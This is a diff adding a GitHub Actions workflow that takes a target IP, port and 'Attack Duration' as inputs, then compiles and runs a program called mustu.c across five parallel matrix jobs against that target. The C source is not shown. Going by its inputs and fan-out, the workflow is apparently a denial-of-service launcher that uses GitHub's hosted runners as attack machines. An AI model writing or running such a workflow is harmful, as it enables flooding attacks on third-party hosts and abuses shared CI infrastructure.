@@ -1,0 +1,35 @@
+name: mustu op 50x
+
+on:
+  workflow_dispatch:
+    inputs:
+      ip:
+        description: "Target IP"
+        required: true
+      port:
+        description: "Target Port"
+        required: true
+      time:
+        description: "Attack Duration"
+        required: true
+
+jobs:
+  mustu:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        n: [1,2,3,4,5]
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Install GCC
+        run: sudo apt-get update && sudo apt-get install -y build-essential
+
+      - name: Compile mustu.c
+        run: gcc mustu.c -pthread -o mustu
+
+      - name: Make mustu executable
+        run: chmod +x mustu
+
+      - name: Run mustu
+        run: ./mustu ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }}
